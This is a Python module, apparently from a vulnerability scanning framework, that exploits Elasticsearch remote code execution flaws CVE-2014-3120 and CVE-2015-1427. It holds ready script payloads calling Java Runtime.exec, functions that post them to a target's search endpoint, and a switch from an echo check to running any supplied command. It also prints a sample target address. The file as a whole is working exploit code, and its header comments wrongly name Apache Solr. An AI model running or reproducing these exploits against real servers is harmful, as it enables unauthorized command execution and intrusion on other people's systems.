import random,string,requests,json,re
from ClassCongregation import _urlparse
from requests_toolbelt.utils import dump
from urllib.parse import urlparse, quote
import CodeTest
################
##--ApacheSolr--##
#cve_2014_3120 无回显的命令执行, 默认VULN = None, 7.1.0以上(包含)版本已删除RunExecutableListener
#cve_2015_1427 
################
#echo VuLnEcHoPoCSuCCeSS
#VULN = None => 漏洞测试
#VULN = True => 命令执行
CodeTest.VULN = None
TIMEOUT = 10
class Elasticsearch():
    def __init__(self, url, CMD):
        # http.client.HTTPConnection._http_vsn_str = 'HTTP/1.1'
        self.url = url
        self.CMD = CMD
        self.getipport = urlparse(self.url)
        self.hostname = self.getipport.hostname
        self.port = self.getipport.port
        if self.port == None and r"https://" in self.url:
            self.port = 443
        elif self.port == None and r"http://" in self.url:
            self.port = 80
        if r"https://" in self.url:
            self.url = "https://"+self.hostname+":"+str(self.port)
        if r"http://" in self.url:
            self.url = "http://"+self.hostname+":"+str(self.port)
        self.host = self.hostname + ":" + str(self.port)
        self.headers = {
            'Host': ""+self.host,
            'Accept': '*/*',
            'Connection': 'close',
            'Accept-Language': 'en',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        self.payload_cve_2014_3120 = r'''{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":''' \
            r'''{"command":{"script":"import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec''' \
            r'''(\"RECOMMAND\").getInputStream()).useDelimiter(\"\\\\A\").next();"}}}'''
        self.payload_cve_2015_1427 = r'''{"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"RECOMMAND\").getText()"}}}'''
    def cve_2014_3120(self):
        self.pocname = "Elasticsearch: CVE-2014-3120"
        self.method = "post"
        self.rawdata = "null"
        self.info = CodeTest.Colored_.rce()
        self.data_send_info = r'''{ "name": "cve-2014-3120" }'''
        self.data_rce = self.payload_cve_2014_3120.replace("RECOMMAND", self.CMD)
        try:
            self.request = requests.post(self.url+"/website/blog/", data=self.data_send_info, headers=self.headers, timeout=TIMEOUT, verify=False)
            self.request = requests.post(self.url+"/_search?pretty", data=self.data_rce, headers=self.headers, timeout=TIMEOUT, verify=False)
            self.r = list(json.loads(self.request.text)["hits"]["hits"])[0]["fields"]["command"][0]
            self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
            CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

    def cve_2015_1427(self):
        self.pocname = "Elasticsearch: CVE-2015-1427"
        self.method = "post"
        self.rawdata = "null"
        self.info = CodeTest.Colored_.rce()
        self.data_send_info = r'''{ "name": "cve-2015-1427" }'''
        self.data_rce = self.payload_cve_2015_1427.replace("RECOMMAND", self.CMD)
        self.host = self.hostname + ":" + str(self.port)
        self.headers_text = {
            'Host': ""+self.host,
            'Accept': '*/*',
            'Connection': 'close',
            'Accept-Language': 'en',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
            'Content-Type': 'application/text'
        }
        try:
            self.request = requests.post(self.url + "/website/blog/", data=self.data_send_info, headers=self.headers,
                                         timeout=TIMEOUT, verify=False)
            self.request = requests.post(self.url + "/_search?pretty", data=self.data_rce, headers=self.headers_text,
                                     timeout=TIMEOUT, verify=False)
            self.r = list(json.loads(self.request.text)["hits"]["hits"])[0]["fields"]["lupin"][0]
            self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
            CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

print("""eg: http://106.53.249.95:8983
+-------------------+------------------+-----+-----+-------------------------------------------------------------+
| Target type       | Vuln Name        | Poc | Exp | Impact Version && Vulnerability description                 |
+-------------------+------------------+-----+-----+-------------------------------------------------------------+
| Elasticsearch     | cve_2014_3120    |  Y  |  Y  | < 1.2, elasticsearch remote code execution                  |
| Elasticsearch     | cve_2015_1427    |  Y  |  Y  | 1.4.0 < 1.4.3, elasticsearch remote code execution          |
+-------------------+------------------+-----+-----+-------------------------------------------------------------+""")
def check(**kwargs):
    if CodeTest.VULN == None:
        ExpElasticsearch = Elasticsearch(_urlparse(kwargs['url']),"echo VuLnEcHoPoCSuCCeSS")
    else:
        ExpElasticsearch = Elasticsearch(_urlparse(kwargs['url']),kwargs['cmd'])
    if kwargs['pocname'] == "cve_2014_3120":
        ExpElasticsearch.cve_2014_3120()
    elif kwargs['pocname'] == "cve_2015_1427":
        ExpElasticsearch.cve_2015_1427()
    else:
        ExpElasticsearch.cve_2014_3120()
        ExpElasticsearch.cve_2015_1427()
